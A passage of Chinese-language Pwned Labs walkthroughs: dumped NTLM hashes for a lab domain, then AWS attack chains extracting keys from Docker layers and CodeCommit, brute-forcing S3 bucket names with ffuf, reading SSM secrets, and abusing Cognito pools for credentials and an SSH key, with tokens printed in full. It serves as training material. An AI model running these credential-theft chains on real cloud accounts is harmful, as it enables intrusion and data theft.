huge-logistics.local\knox.hannis:1321:aad3b435b51404eeaad3b435b51404ee:448693c8572e0366aa5d3918a6cc08c4:::
huge-logistics.local\dory.benedikta:1322:aad3b435b51404eeaad3b435b51404ee:b40ca15aa19918649ceddda91b494b3b:::
huge-logistics.local\emalia.denyse:1323:aad3b435b51404eeaad3b435b51404ee:6c76d40a6e9e60e05da802ecdb212f04:::
huge-logistics.local\shauna.lev:1324:aad3b435b51404eeaad3b435b51404ee:ae585941f9f3d27f4e2c5abed03e7e21:::
huge-logistics.local\ibby.arlen:1325:aad3b435b51404eeaad3b435b51404ee:177490da008d69c92437f9c691d2b98a:::
huge-logistics.local\justinn.clea:1326:aad3b435b51404eeaad3b435b51404ee:b06c2cc83706d1e6dbf13bbcbcc0c3b5:::
huge-logistics.local\kattie.kerby:1327:aad3b435b51404eeaad3b435b51404ee:f60876504bd41f61e41da864b4c5ed0b:::
huge-logistics.local\sonnnie.candy:1328:aad3b435b51404eeaad3b435b51404ee:d27a453ccc517df283e5070e6d9ff807:::
huge-logistics.local\nada.ashley:1329:aad3b435b51404eeaad3b435b51404ee:4881967dd8c4b91152df49aa204abaf2:::
huge-logistics.local\madeleine.darci:1330:aad3b435b51404eeaad3b435b51404ee:ef162b2ca610b92ccab9d4fef51f0067:::
huge-logistics.local\candace.ame:1331:aad3b435b51404eeaad3b435b51404ee:46f95b31dc295924d6f133ce690f5985:::
huge-logistics.local\flory.julia:1332:aad3b435b51404eeaad3b435b51404ee:b6e56cb45e03291a87b80e42f49d1571:::
huge-logistics.local\melisenda.dredi:1333:aad3b435b51404eeaad3b435b51404ee:9ccd7703afcd320654db5a32c9598258:::
huge-logistics.local\domeniga.sherrie:1334:aad3b435b51404eeaad3b435b51404ee:dfde928bba2e479c7b7606aa74700edf:::
huge-logistics.local\agnesse.coraline:1335:aad3b435b51404eeaad3b435b51404ee:1b7384d27e41e78353c94c79358d45e1:::
huge-logistics.local\jessy.roxine:1336:aad3b435b51404eeaad3b435b51404ee:c03b44b32f3a00534d08dfa8780e81e7:::
huge-logistics.local\pippy.celine:1337:aad3b435b51404eeaad3b435b51404ee:a50c87bb6ce8b530156141602f157930:::
huge-logistics.local\nydia.raye:1338:aad3b435b51404eeaad3b435b51404ee:283d4a5be16c23fccdd8311fc1e3aebd:::
huge-logistics.local\candace.fianna:1339:aad3b435b51404eeaad3b435b51404ee:68c47182905ae9c21a0141f0ce08731e:::
huge-logistics.local\sharron.pippy:1340:aad3b435b51404eeaad3b435b51404ee:fb3157bf35156c04c6c30bfad810fcca:::
huge-logistics.local\margalit.robinetta:1341:aad3b435b51404eeaad3b435b51404ee:b933c1eb6d3783be8d4906495ba92413:::
huge-logistics.local\cherida.ag:1342:aad3b435b51404eeaad3b435b51404ee:ff99862661171ce0c10059b350ea720c:::
huge-logistics.local\glenn.marylinda:1343:aad3b435b51404eeaad3b435b51404ee:372bf2ab06d661499b339c1ddbdf5fef:::
huge-logistics.local\evonne.dyane:1344:aad3b435b51404eeaad3b435b51404ee:6f3fade40793fa301ef4c5c73b3054c1:::
huge-logistics.local\rozanne.nady:1345:aad3b435b51404eeaad3b435b51404ee:70ce46eb6b877b4c69b2bbd4c51d6a7c:::
huge-logistics.local\galina.charin:1346:aad3b435b51404eeaad3b435b51404ee:0055584f18e12377e2d23e1167537728:::
huge-logistics.local\athena.florry:1347:aad3b435b51404eeaad3b435b51404ee:f4d6455aa45c36e5945e165cd36c9fde:::
huge-logistics.local\amalita.feodora:1348:aad3b435b51404eeaad3b435b51404ee:50fe1b3e4f83f0f0f8fcca2736ae6279:::
huge-logistics.local\nickie.barry:1349:aad3b435b51404eeaad3b435b51404ee:c3d6eb4ecb0c259d1019d17c2630750c:::
huge-logistics.local\gaynor.danila:1350:aad3b435b51404eeaad3b435b51404ee:dcaa34c922c27932e3e1c8e7c4080efe:::
huge-logistics.local\jamie.shani:1351:aad3b435b51404eeaad3b435b51404ee:4a46d9baa340a9c050f1a50392f53efa:::
huge-logistics.local\joanne.daniela:1352:aad3b435b51404eeaad3b435b51404ee:9035c9bf8d20f1ea2c476dff8fd0501a:::
huge-logistics.local\marga.adda:1353:aad3b435b51404eeaad3b435b51404ee:f7819cede2f34c7810ae0747b4b3d7e3:::
huge-logistics.local\deonne.kennith:1354:aad3b435b51404eeaad3b435b51404ee:e5fd3bd8b6e374594b0e8112e523530a:::
huge-logistics.local\gilly.deva:1355:aad3b435b51404eeaad3b435b51404ee:b41e0098c71b001cf796966978c33b51:::
huge-logistics.local\leandra.charmion:1356:aad3b435b51404eeaad3b435b51404ee:f526cdf96129073e9220f71d32fa7455:::
huge-logistics.local\elysha.loraine:1357:aad3b435b51404eeaad3b435b51404ee:ba4949be30d61bcf15103511e5c6f06b:::
huge-logistics.local\blair.rosabella:1358:aad3b435b51404eeaad3b435b51404ee:a4a02c448197f67cd9e982a5e5d0acc3:::
huge-logistics.local\rebeca.juliette:1359:aad3b435b51404eeaad3b435b51404ee:c52abb1e14677d7ea228fcc1171ed7b7:::
huge-logistics.local\morgan.killie:1360:aad3b435b51404eeaad3b435b51404ee:518f4466aa0a9078413190e8190d307e:::
huge-logistics.local\josee.marti:1361:aad3b435b51404eeaad3b435b51404ee:188fd35f30c6dc11488e5690ddeaf733:::
mssql_svc:1362:aad3b435b51404eeaad3b435b51404ee:89c99393bfe3c0a95deba6dcb0b12b43:::
http_svc:1363:aad3b435b51404eeaad3b435b51404ee:36fa8f2d6a8467b5ea57204c4f5c03bf:::
exchange_svc:1364:aad3b435b51404eeaad3b435b51404ee:d91c662a4bee1e180ec0e3c80dde2342:::
huge-logistics.local\livvie.bertie:1365:aad3b435b51404eeaad3b435b51404ee:3ce3570c736be9d22b26aaefc9e004ec:::
huge-logistics.local\robinette.robinette:1366:aad3b435b51404eeaad3b435b51404ee:4f4b114d07434f930cd50aa5527c14c0:::

```

之后也可以用hashcat对hash进行破解。





## 12.Uncover Secrets in CodeCommit and Docker

入口需要搜索docker镜像，查找到到一个相关的docker镜像：

![image-20231023163517175](pwnedlabs.assets/image-20231023163517175.png)

在层中找到了aksk，相当于将aksk写到env里

![image-20231023163711007](pwnedlabs.assets/image-20231023163711007.png)



```bash
#whoami
aws sts get-caller-identity --no-cli-pager
{
    "UserId": "AIDA3NRSK2PTAUXNEJTBN",
    "Account": "785010840550",
    "Arn": "arn:aws:iam::785010840550:user/prod-deploy"
}

#利用enumerate-iam.py工具枚举出具有list-repositories权限
aws codecommit list-repositories --no-cli-pager
{
    "repositories": [
        {
            "repositoryName": "vessel-tracking",
            "repositoryId": "beb7df6c-e3a2-4094-8fc5-44451afc38d3"
        }
    ]
}

#查看仓库信息
aws codecommit get-repository --repository-name vessel-tracking --no-cli-pager
{
    "repositoryMetadata": {
        "accountId": "785010840550",
        "repositoryId": "beb7df6c-e3a2-4094-8fc5-44451afc38d3",
        "repositoryName": "vessel-tracking",
        "repositoryDescription": "Vessel Tracking App",
        "defaultBranch": "master",
        "lastModifiedDate": "2023-07-21T01:50:46.826000+08:00",
        "creationDate": "2023-07-20T05:11:19.845000+08:00",
        "cloneUrlHttp": "https://git-codecommit.us-east-1.amazonaws.com/v1/repos/vessel-tracking",
        "cloneUrlSsh": "ssh://git-codecommit.us-east-1.amazonaws.com/v1/repos/vessel-tracking",
        "Arn": "arn:aws:codecommit:us-east-1:785010840550:vessel-tracking"
    }
}

#列出仓库的所有分支
aws codecommit list-branches --repository-name vessel-tracking --no-cli-pager
{
    "branches": [
        "master",
        "dev"
    ]
}


aws codecommit get-branch --repository-name vessel-tracking --branch-name dev --no-cli-pager
{
    "branch": {
        "branchName": "dev",
        "commitId": "b63f0756ce162a3928c4470681cf18dd2e4e2d5a"
    }
}

aws codecommit get-branch --repository-name vessel-tracking --branch-name master --no-cli-pager
{
    "branch": {
        "branchName": "master",
        "commitId": "8f355a0fedcdf3a9764c4388fd825bd1f5a30818"
    }
}

#获取commit信息，发现dev分支的这次commit的meaage，允许s3的调用去更普遍的工作。因此猜测可能存在一些信息。
aws codecommit get-commit --repository-name vessel-tracking --commit-id b63f0756ce162a3928c4470681cf18dd2e4e2d5a -
-no-cli-pager
{
    "commit": {
        "commitId": "b63f0756ce162a3928c4470681cf18dd2e4e2d5a",
        "treeId": "5718a0915f230aa9dd0292e7f311cb53562bb885",
        "parents": [
            "2272b1b6860912aa3b042caf9ee3aaef58b19cb1"
        ],
        "message": "Allow S3 call to work universally\n",
        "author": {
            "name": "Jose Martinez",
            "email": "jose@pwnedlabs.io",
            "date": "1689875383 +0100"
        },
        "committer": {
            "name": "Jose Martinez",
            "email": "jose@pwnedlabs.io",
            "date": "1689875383 +0100"
        },
        "additionalData": ""
    }
}

#查看这个commit
aws codecommit get-commit --repository-name vessel-tracking --commit-id 8f355a0fedcdf3a9764c4388fd825bd1f5a30818 --no-cli-pager
{
    "commit": {
        "commitId": "8f355a0fedcdf3a9764c4388fd825bd1f5a30818",
        "treeId": "8e2d7f189e4cc072594bdf1a222033990ec1d7b1",
        "parents": [],
        "message": "Initial Commit\n",
        "author": {
            "name": "Jose Martinez",
            "email": "jose@pwnedlabs.io",
            "date": "1689872643 +0100"
        },
        "committer": {
            "name": "Jose Martinez",
            "email": "jose@pwnedlabs.io",
            "date": "1689872643 +0100"
        },
        "additionalData": ""
    }
}

#查看commit的differences，
aws codecommit get-differences --repository-name vessel-tracking --after-commit-specifier b63f0756ce162a3928c4470681cf18dd2e4e2d5a --before-commit-specifier 2272b1b6860912aa3b042caf9ee3aaef58b19cb1

            "afterBlob": {
                "blobId": "39bb76cad12f9f622b3c29c1d07c140e5292a276",
                "path": "js/server.js",
                "mode": "100644"
            },
            "changeType": "A"
        },
        
#读取这个server.js
aws codecommit get-file --repository-name vessel-tracking --commit-specifier b63f0756ce162a3928c4470681cf18dd2e4e2d5a --file-path js/server.js --no-cli-pager
{
    "commitId": "b63f0756ce162a3928c4470681cf18dd2e4e2d5a",
    "blobId": "39bb76cad12f9f622b3c29c1d07c140e5292a276",
    "filePath": "js/server.js",
    "fileMode": "NORMAL",
    "fileSize": 1702,
    "fileContent": "Y29uc3QgZXhwcmVzcyA9IHJlcXVpcmUoJ2V4cHJlc3MnKTsKY29uc3QgYXhpb3MgPSByZXF1aXJlKCdheGlvcycpOwpjb25zdCBBV1MgPSByZXF1aXJlKCdhd3Mtc2RrJyk7CmNvbnN0IHsgdjQ6IHV1aWR2NCB9ID0gcmVxdWlyZSgndXVpZCcpOwpyZXF1aXJlKCdkb3RlbnYnKS5jb25maWcoKTsKCmNvbnN0IGFwcCA9IGV4cHJlc3MoKTsKY29uc3QgUE9SVCA9IHByb2Nlc3MuZW52LlBPUlQgfHwgMzAwMDsKCi8vIEFXUyBTZXR1cApjb25zdCBBV1NfQUNDRVNTX0tFWSA9ICdBS0lBM05SU0syUFRMR0FXV0xURyc7CmNvbnN0IEFXU19TRUNSRVRfS0VZID0gJzJ3Vnd3NVZFQWM2NWVXV21oc3VVVXZGRVRUNyt5bVlHTGptZUNoYXMnOwoKQVdTLmNvbmZpZy51cGRhdGUoewogICAgcmVnaW9uOiAndXMtZWFzdC0xJywgIC8vIENoYW5nZSB0byB5b3VyIHJlZ2lvbgogICAgYWNjZXNzS2V5SWQ6IEFXU19BQ0NFU1NfS0VZLAogICAgc2VjcmV0QWNjZXNzS2V5OiBBV1NfU0VDUkVUX0tFWQp9KTsKY29uc3QgczMgPSBuZXcgQVdTLlMzKCk7CgphcHAudXNlKChyZXEsIHJlcywgbmV4dCkgPT4gewogICAgLy8gR2VuZXJhdGUgYSByZXF1ZXN0IElECiAgICByZXEucmVxdWVzdElEID0gdXVpZHY0KCk7CiAgICBuZXh0KCk7Cn0pOwoKYXBwLmdldCgnL3Zlc3NlbC86bXNzaScsIGFzeW5jIChyZXEsIHJlcykgPT4gewogICAgdHJ5IHsKICAgICAgICBjb25zdCBtc3NpID0gcmVxLnBhcmFtcy5tc3NpOwoKICAgICAgICAvLyBGZXRjaCBkYXRhIGZyb20gTWFyaW5lVHJhZmZpYyBBUEkKICAgICAgICBsZXQgcmVzcG9uc2UgPSBhd2FpdCBheGlvcy5nZXQoYGh0dHBzOi8vYXBpLm1hcmluZXRyYWZmaWMuY29tL3Zlc3NlbC8ke21zc2l9YCwgewogICAgICAgICAgICBoZWFkZXJzOiB7ICdBcGktS2V5JzogcHJvY2Vzcy5lbnYuTUFSSU5FX0FQSV9LRVkgfQogICAgICAgIH0pOwoKICAgICAgICBsZXQgZGF0YSA9IHJlc3BvbnNlLmRhdGE7IC8vIE1vZGlmeSBhcyBwZXIgYWN0dWFsIEFQSSByZXNwb25zZSBzdHJ1Y3R1cmUKCiAgICAgICAgLy8gVXBsb2FkIHRvIFMzCiAgICAgICAgbGV0IHBhcmFtcyA9IHsKICAgICAgICAgICAgQnVja2V0OiAndmVzc2VsLXRyYWNraW5nJywKICAgICAgICAgICAgS2V5OiBgJHttc3NpfS5qc29uYCwKICAgICAgICAgICAgQm9keTogSlNPTi5zdHJpbmdpZnkoZGF0YSksCiAgICAgICAgICAgIENvbnRlbnRUeXBlOiAiYXBwbGljYXRpb24vanNvbiIKICAgICAgICB9OwoKICAgICAgICBzMy5wdXRPYmplY3QocGFyYW1zLCBmdW5jdGlvbiAoZXJyLCBzM2RhdGEpIHsKICAgICAgICAgICAgaWYgKGVycikgcmV0dXJuIHJlcy5zdGF0dXMoNTAwKS5qc29uKGVycik7CiAgICAgICAgICAgIAogICAgICAgICAgICAvLyBTZW5kIGRhdGEgdG8gZnJvbnRlbmQKICAgICAgICAgICAgcmVzLmpzb24oewogICAgICAgICAgICAgICAgZGF0YSwKICAgICAgICAgICAgICAgIHJlcXVlc3RJRDogcmVxLnJlcXVlc3RJRAogICAgICAgICAgICB9KTsKICAgICAgICB9KTsKCiAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgIHJlcy5zdGF0dXMoNTAwKS5qc29uKHsgZXJyb3I6ICJFcnJvciBmZXRjaGluZyB2ZXNzZWwgZGF0YS4iIH0pOwogICAgfQp9KTsKCmFwcC5saXN0ZW4oUE9SVCwgKCkgPT4gewogICAgY29uc29sZS5sb2coYFNlcnZlciBpcyBydW5uaW5nIG9uIFBPUlQgJHtQT1JUfWApOwp9KTsKCg=="
}

```



base64解码得到一段js操作aws的代码，里面给了aksk：

```js
const express = require('express');
const axios = require('axios');
const AWS = require('aws-sdk');
const { v4: uuidv4 } = require('uuid');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// AWS Setup
const AWS_ACCESS_KEY = 'AKIA3NRSK2PTLGAWWLTG';
const AWS_SECRET_KEY = '2wVww5VEAc65eWWmhsuUUvFETT7+ymYGLjmeChas';

AWS.config.update({
    region: 'us-east-1',  // Change to your region
    accessKeyId: AWS_ACCESS_KEY,
    secretAccessKey: AWS_SECRET_KEY
});
const s3 = new AWS.S3();

app.use((req, res, next) => {
    // Generate a request ID
    req.requestID = uuidv4();
    next();
});

app.get('/vessel/:mssi', async (req, res) => {
    try {
        const mssi = req.params.mssi;

        // Fetch data from MarineTraffic API
        let response = await axios.get(`https://api.marinetraffic.com/vessel/${mssi}`, {
            headers: { 'Api-Key': process.env.MARINE_API_KEY }
        });

        let data = response.data; // Modify as per actual API response structure

        // Upload to S3
        let params = {
            Bucket: 'vessel-tracking',
            Key: `${mssi}.json`,
            Body: JSON.stringify(data),
            ContentType: "application/json"
        };

        s3.putObject(params, function (err, s3data) {
            if (err) return res.status(500).json(err);
            
            // Send data to frontend
            res.json({
                data,
                requestID: req.requestID
            });
        });

    } catch (error) {
        res.status(500).json({ error: "Error fetching vessel data." });
    }
});

app.listen(PORT, () => {
    console.log(`Server is running on PORT ${PORT}`);
});


```

配置好之后读取flag即可：

```bash
aws sts get-caller-identity --no-cli-pager
{
    "UserId": "AIDA3NRSK2PTJN636WIHU",
    "Account": "785010840550",
    "Arn": "arn:aws:iam::785010840550:user/code-admin"
}

aws s3 ls s3://vessel-tracking --no-cli-pager
2023-07-21 02:25:17         32 flag.txt
2023-07-21 02:35:56      21810 vessel-id-ae
```



## 13.s3 bucket brute force to breach

入口是一个s3，进去下载index.html下来查看一下，发现里面有几个s3：

```bash
hlogistics-images
https://hlogistics-staticfiles.s3.amazonaws.com/main.js
```

格式都是`hlogistics-xx`

再看一下区域：

```bash
curl -I https://hlogistics-staticfiles.s3.amazonaws.com/
HTTP/1.1 200 OK
x-amz-id-2: Oe485EKL9NNSmJnQgXA1fpxbyppNFeKVVH+dvW7ynFBEZUIRhFYQh9xKMRNdTMYYdTUKr/EoqS4=
x-amz-request-id: SGHH6NC2TKNTTXMD
Date: Mon, 23 Oct 2023 10:51:14 GMT
x-amz-bucket-region: eu-west-2
x-amz-access-point-alias: false
Content-Type: application/xml
Server: AmazonS3
```

是eu-west-2区域。本题应该是要根据s3的格式爆破一下s3。利用ffuf工具爆破：

```bash
ffuf -u https://hlogistics-FUZZ.s3.amazonaws.com/ -w '/Users/feng/many-ctf/my-fuzz-wordlist/aws/aws-s3-bucket-wordlist.txt:FUZZ'

images                  [Status: 200, Size: 8959, Words: 4, Lines: 2, Duration: 284ms]
web                     [Status: 200, Size: 535, Words: 4, Lines: 2, Duration: 299ms]
staticfiles             [Status: 200, Size: 8495, Words: 4, Lines: 2, Duration: 286ms]
beta                    [Status: 200, Size: 554, Words: 4, Lines: 2, Duration: 275ms]
```



访问hlogistics-beta存储桶，发现一个python文件，里面有aksk。

配置好之后列举下权限：

```bash
aws sts get-caller-identity --no-cli-pager
{
    "UserId": "AIDATRPHKUQK3U6DLVPIY",
    "Account": "243687662613",
    "Arn": "arn:aws:iam::243687662613:user/ecollins"
}


aws iam list-attached-user-policies --user-name ecollins --no-cli-pager
{
    "AttachedPolicies": [
        {
            "PolicyName": "ecollins",
            "PolicyArn": "arn:aws:iam::243687662613:policy/ecollins"
        }
    ]
}


aws dynamodb describe-endpoints --no-cli-pager
{
    "Endpoints": [
        {
            "Address": "dynamodb.eu-west-2.amazonaws.com",
            "CachePeriodInMinutes": 1440
        }
    ]
}


aws iam list-user-policies --user-name ecollins --no-cli-pager
{
    "PolicyNames": [
        "SSM_Parameter"
    ]
}


aws iam get-user-policy --user-name ecollins --policy-name SSM_Parameter --no-cli-pager
{
    "UserName": "ecollins",
    "PolicyName": "SSM_Parameter",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Action": [
                    "ssm:GetParameter",
                    "ssm:DescribeParameters"
                ],
                "Resource": "arn:aws:ssm:eu-west-2:243687662613:parameter/lharris"
            }
        ]
    }
}
```

发现ecollins用户对ssm服务可执行get-parameter，ssm的Parameter Store，用于集中管理密钥和配置数据等，将敏感数据与代码和配置分离。

```bash
aws ssm get-parameter --name lharris --no-cli-pager
{
    "Parameter": {
        "Name": "lharris",
        "Type": "StringList",
        "Value": "AKIATRPHKUQK7PLPPVRR,Cd3XasHrvc6szJmU9b/Imzc+MXQJf/drqCKfSWFj",
        "Version": 1,
        "LastModifiedDate": "2023-08-21T02:50:43.250000+08:00",
        "ARN": "arn:aws:ssm:eu-west-2:243687662613:parameter/lharris",
        "DataType": "text"
    }
}
#拿到aksk，配置好之后枚举权限，发现可以list-functions
aws lambda list-functions --no-cli-pager
{
    "Functions": [
        {
            "FunctionName": "crew_administration_data",
            "FunctionArn": "arn:aws:lambda:eu-west-2:243687662613:function:crew_administration_data",
            "Runtime": "python3.8",
            "Role": "arn:aws:iam::243687662613:role/lambda-empty-role",
            "Handler": "index.lambda_handler",
            "CodeSize": 18968,
            "Description": "",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2023-08-20T19:59:44.000+0000",
            "CodeSha256": "RPCuNGeiPPknudz6i0jDNx4S017TS5MfmZ/pcIFG7tk=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "68d6b934-7a45-40a7-9305-fad3e874a4ad",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            }
        }
    ]
}
#调用函数，获得管理员的相关数据。
aws lambda invoke --function-name crew_administration_data  output.txt
#从output.txt中可以找到flag。
```



## 14.Abuse Cognito User and Identity Pools

相对来说比之前都难，学了一波Cognito。



```bash
#获得identityid
aws cognito-identity get-id --identity-pool-id us-east-1:d2fecd68-ab89-48ae-b70f-44de60381367 --no-sign-request --no-cli-pager
{
    "IdentityId": "us-east-1:06a13cbe-d10c-43f6-bd44-eee7d773c61b"
}

#获取凭证。此时是匿名获取的凭证，因此权限较低。
aws cognito-identity get-credentials-for-identity --identity-id us-east-1:06a13cbe-d10c-43f6-bd44-eee7d773c61b --no-sign-request --no-cli-pager
{
    "IdentityId": "us-east-1:06a13cbe-d10c-43f6-bd44-eee7d773c61b",
    "Credentials": {
        "AccessKeyId": "ASIAWHEOTHRF6MKX6EUO",
        "SecretKey": "VvOy6Y0YfQewR7pksn0N/yQQjs7veTUhOW2mRXR9",
        "SessionToken": "IQoJb3JpZ2luX2VjEAQaCXVzLWVhc3QtMSJGMEQCIDmLMcxG5Rfh7rd3NzGW6Jr90P9IChIrgtB1bI4uJoGlAiBQMMiEPU0nrktRpV+qA2N+L6MmUKziGbZ9mhNGPWUEdyrJBQgtEAAaDDQyNzY0ODMwMjE1NSIMr875LIFuFKOgfNHGKqYFJ8YFneyO6uO6XScJ8ehSBLbI74+DUDhB748K/b/3/iOzaZjJBwTfGE/CV6R8wCDE4QNcsCZmU8RMUocbXgZ99M5PR+aMeTRgIIxwv+XH6lfOCb8OVIgzTz6ZzU/bexCoz2sfvJW1gx4xVjOm4hsqFcM5AJLg8SMxgiR1kse2fgr+SOoeHla2nrzr9E+4CcVueG1rVo+EGQT7ktJx6xA37DVgRT6ALRYUVYCE8kXEZgTESxxr/j5sEoftwKV0H154AJGJzXjY6RrUILfp3AOV06bCDlvt23ZXK3ExGi24lcaU7Vy4gT0aBI4iWTCyk+RjMr5BDv7sVNDxxHGfWhW1kYJSVlGdcx+b08T16vWV43i0dW750b5nRADgcm+1qozFoTX0waUvwTj0O/B2bbBQ8Ngcbeq4uBOrhNMC/GGIjHgsJnTbFmKiGmgCEXTEgI5/HO3PRqLry6bfZxARZIKUHPHeM5+W+3GTA7G3ZDF+fQxSeWLkI+xs8GKtGWfnwENiMfAWI9pe+iQc4M9ky7qNDLDAY5AcYFnqHUd/tW6hbLXx5tF0fClkkRw/TwSNO1RSOt0o+gU8oeGc0eaP1S6zH+xIVWnTKQTc/yk27ogJuw1xHS0mAieNA/291ZKiWaxTlXmlPSlH8MUJXu3u0wPPJekVlETu4fu2tLYyfOwX3P9SLy5OTiJRcvrU1CuCTYFn18+fErrZnd1vQyJJy7/g8dc+v1suMcmwX28Ed6CbDFUreEb7jYxgEx3eG3LINQkfXrhNi+lk0gqlqvp9/81Zr6PoN7D9PaCIumM1H8CnGpPP8ktb/SxN/jkWxBFgopyGDoDucRwknOqzxhojfJXO+tpXRZ+XGnT3AOVZneZ/nYwiBDf807LAJByyAoxu438RLBGzAaB6MPS32akGOt4COG5ahZZiRJeMD/dAbEvT6xbzqSkSTJZP30/GPm3W5/vwccXMAPF75g1iXCHiHESq7eYpe178GIi9LttmSVDyR9PNx8ao8FgFMDid93TkJ3JDbio6UzCz4K78wt2QNCXm23NbTCQQD9P/m+UddVRO8+UNb5LymQgFo86Wfq1uyoy7MX94s/wKPd/iUv9sZMmVZT9Vmj+gADK1ntNWHamM0a78D0e5bP7yLwPl1Df0VDzKE9hA0zqAk9fwg0UNIq/EdbpRSLr8d7M9OX3Cl4F9GtZVnZNTptDxFBSw3gazG9mVGkDVRV96Fr9/RsWElIhz4vlffThYnKyFU8VmBUXXg47QE43DCk+1IUiw+Fh0KJxce0xJmbz4iI7ZhwK9xwJIV0O70uhXs/aZ9awbCQiKisdJGXFCrlkB4RRfMm2c0M5nbcX+I+kAAwU6C+PsJzxL6v1pEZf94E/R/6yXjbE=",
        "Expiration": "2023-10-23T20:41:40+08:00"
    }
}
```



配置好后可以访问s3：

```bash
aws s3 cp s3://hl-app-images/temp/id_rsa ./
```



题目还给了一个User Pool，Client ID是 `16f1g98bfuj9i0g3f8be36kkrl` 。

```bash
#尝试注册，在之前可能进行弱密码登录但是失败
aws cognito-idp sign-up --client-id 16f1g98bfuj9i0g3f8be36kkrl --username feng1 --password "FENGfeng123@@@" --user-attributes Name="email",Value="sulishi141592653@gmail.com"
{
    "UserConfirmed": false,
    "CodeDeliveryDetails": {
        "Destination": "s***@g***",
        "DeliveryMedium": "EMAIL",
        "AttributeName": "email"
    },
    "UserSub": "6f3921d7-c684-40e6-94a2-b1f3077ebd17"
}

aws cognito-idp confirm-sign-up --client-id 16f1g98bfuj9i0g3f8be36kkrl --username feng1 --confirmation-code 497147

#即sign-in
aws cognito-idp initiate-auth --auth-flow USER_PASSWORD_AUTH --client-id 16f1g98bfuj9i0g3f8be36kkrl --auth-parameters USERNAME=feng1,PASSWORD=FENGfeng123@@@ --no-cli-pager
{
    "ChallengeParameters": {},
    "AuthenticationResult": {
        "AccessToken": "eyJraWQiOiJDTFRKamV3bm5sT3BXTmxzOTZhbW1veEtZaHFqMVBuWjJrMXdMVVg2bno0PSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiI2ZjM5MjFkNy1jNjg0LTQwZTYtOTRhMi1iMWYzMDc3ZWJkMTciLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb21cL3VzLWVhc3QtMV84cmNLN2FidHoiLCJjbGllbnRfaWQiOiIxNmYxZzk4YmZ1ajlpMGczZjhiZTM2a2tybCIsIm9yaWdpbl9qdGkiOiIzMjc1ODM2OS01ZGVhLTRlMGQtYjlhMi05ODVmZTk4NWQ1YzQiLCJldmVudF9pZCI6IjFmMjNmODZkLWRhNjQtNDdjNi05NDhkLWJlOTA3NzEwNmQyNyIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE2OTgwNjQ4NjIsImV4cCI6MTY5ODA2ODQ2MiwiaWF0IjoxNjk4MDY0ODYyLCJqdGkiOiJmYjI2NTFiNy0wZTc1LTQzOWYtODc0ZS04NmNkYmFmNTU4ZWIiLCJ1c2VybmFtZSI6ImZlbmcxIn0.GMUIz-nuBYyJoc4OR9x3iFUzpAhAVyOA8phyNmGDHM9Q9RIkIvSqYDsGeF_ECZUbow47963WlWo4m_-9lCESYFGnnA_97FDRnZCq5t7QBkSqN53eL2Jvu-0LRLQWA_SmVp-kjcjQPPvj9zvbo04wyfp8KqNad8vwX7X6QKFz56Kj34FowUpy4MZ_eZzvA76aznjRSgxyPmQl1MwjK_h74QSLVircQtTx0lx1Q-6QaMJfp1ifXuRUp5hEg_T7jJx3bgWP6Qog7nL9FpqMtZSyMfT1F-u_3ZnPXcTvgmra-xjcC05vJMU0AgNpnc9QBZQMdUKD1d-XkU6lUJMj9KnOHQ",
        "ExpiresIn": 3600,
        "TokenType": "Bearer",
        "RefreshToken": "eyJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9BRVAifQ.f-INVK-L2DKat-GJU5sDpQJo2yrhemIvLEu3UgU20dbIDw38HJXUov5NgpAwi5L1uZ9POZTBrGn_rom33fs_5881PfCG4GUuufWE2XAaC606M-o4Fpbc4qKpbeJEwwj-aFpc-KldCEuDC6SsbnmCIxSEn4yYpXaO3_pYiO6sllbXiyALwqdmBVXfwtm-BTG3bd6JlqC96MUjZB_lhKa802_vgIDESxVXqHzu7qPsr4t9xUzPwhWN4uKu8ujRBegDzLJJI64W3E4NjuSEzxmjsuptjVx6vfrzBzJ-KI5icVBgPgTL9KXkgrlGrshLym736DWaxxxvp-vNmpMXGh9ajQ.ePEHpXygHe9tMPpn.vxM6lrudM4B0dpTF3VhwNxLbQvvPjtmk840dO3cFK9dHyjid-mUK9Im9vOSnEkdIP04mOUopJ9Le5FP5yr7iZo4r8U6iIeh1UWqKe0J1PAkoeFw2pxHq9jf1tp8HLfv7CJ9xmgoqr6jhHSdQrivG2vteErHU6D2KKJNeY4QSKS8NPImdDKP612lyS4birmQyYKnIV_GTYgbnlWCCmr7m6YIlnsYNlrVn3mQZ9s0lOmoLn3tSoIaa40RDhSJipLKO5Z4CqZJOGZlDDzkC6uuLZHQjYHjcXC1yGVYHGIuA7v-32XzDa5Ar_r2wxLbIuBaBawdcCdpaBKQn1Fk2I8f52o7dTJrHjLqlTDe6Pgt1tVP-EclnlVGUCkkFNse46YMgE6RknPdN2WA5aPaSIN81rx2QuZ-HuoUrI7d_ndeee07-mqaed6vhiKa5d7lD0vGXQRLkiYdowHoMQfYGi3lYbt6qRuKQoie7qD3UbtBn5meGaZtYULihH7usEjdFN8-qtQQwqWfbi_WpucamIEv557ArSWxzEKKhckg-0PUmBCjUHKRr56gxv131qsJ8MiklYBAQnPlUeVJBTi5YjhVS2_LmoND8ezL5BHFpY4beoXx2Lt8Zvumylj9rjtxsDO4D61RwqXyMqxN02t3PNK8DyBhlUgMifFDmrXNdqwiqOGqXa5y13Sxm3DGjh6v4_ouc53G7we1CyrpSY-Vnw1zqPeeac9SZGB40o34XlWM_revGwi-LQZoGNp1kErWGiYWlnZfSzSdIHycY1mldxLMGybUCbKB_Uuc-mobdM8I77XNdZi27EXmE8P1m2FyBrx60Mv5-i_tZVM7aI42e3bFWzZ7ojclhW33M9O2BVo82TzCIy93jp5aWaPfpxmvI2YumIh4wd1siry-LKME7C0jPnXNiZHcjssKzwH9PgIWGf83JEx